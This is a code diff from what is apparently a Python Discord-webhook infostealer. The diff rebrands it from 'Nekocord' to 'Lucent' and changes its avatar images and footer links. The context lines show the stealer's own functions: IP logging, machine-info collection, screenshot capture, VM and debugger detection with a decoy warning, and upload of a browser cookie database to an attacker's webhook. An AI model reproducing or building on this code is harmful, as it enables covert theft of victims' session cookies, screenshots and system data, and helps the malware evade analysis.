@@ -44,8 +44,8 @@ def iplogger():
 
     host = socket.gethostname()
     data = {
-        "username": "Nekocord | Address",
-        "avatar_url": "https://i.imgur.com/VF1uUWN.png", 
+        "username": "Lucent | Address",
+        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg", 
         "embeds": [{
             "title": "🏠️ IP INFO",
             "fields": [
@@ -71,7 +71,7 @@ def iplogger():
                 }
             ],
             "footer": {
-                "text": "nekocord. | https://github.com/zakocord/Nekocord"
+                "text": "zakocord. | https://github.com/zakocord/Lucent"
             }
         }]
     }
@@ -98,9 +98,9 @@ def machineinfo():
     pc_name = platform.node()
 
     data2 = {
-        "username": "Nekocord | Machine", 
+        "username": "Lucent | Machine", 
         "content": f"{types}",
-        "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
+        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
         "embeds": [
             {
                 "title": "💻️ Machine Info",
@@ -137,7 +137,7 @@ def machineinfo():
                     }                       
                 ],
                 "footer": {
-                    "text": "nekocord. | https://github.com/zakocord/Nekocord"
+                    "text": "zakocord. | https://github.com/zakocord/Lucent"
                 }   
             }
         ]
@@ -160,9 +160,9 @@ def screenshot():
     with open(screenshot_path, "rb") as f:
         files = {"file": (screenshot_filename, f, "image/png")}
         data = {
-            "username": "Nekocord | Screenshot", 
+            "username": "Lucent | Screenshot", 
             "content": f"📸 Screenshot",
-            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
+            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
         }
         response3 = requests.post(h00k, data=data, files=files)
     
@@ -215,9 +215,9 @@ def checker():
 
     if is_vm:
         data_VM = {
-            "username": "Nekocord | VM Detection",
+            "username": "Lucent | VM Detection",
             "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
-            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
+            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
         }
 
         try:
@@ -231,8 +231,8 @@ def checker():
 def cookie_webhook(webhook_url, status_lines, cookie_db_path):
     try:
         requests.post(webhook_url, json={
-            "username": "Nekocord | Cookie",
-            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
+            "username": "Lucent | Cookie",
+            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
             "embeds": [{
                 "title": "🍪 Cookie Search",
                 "description": "\n".join(status_lines) if status_lines else "No status available",
@@ -242,7 +242,7 @@ def cookie_webhook(webhook_url, status_lines, cookie_db_path):
         with open(cookie_db_path, 'rb') as f:
             data = {
                 "username": "Nekocord | Cookie",
-                "avatar_url": "https://i.imgur.com/VF1uUWN.png",
+                "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
             }
             files = {'file': (os.path.basename(cookie_db_path), f)}
             requests.post(webhook_url, data=data, files=files)
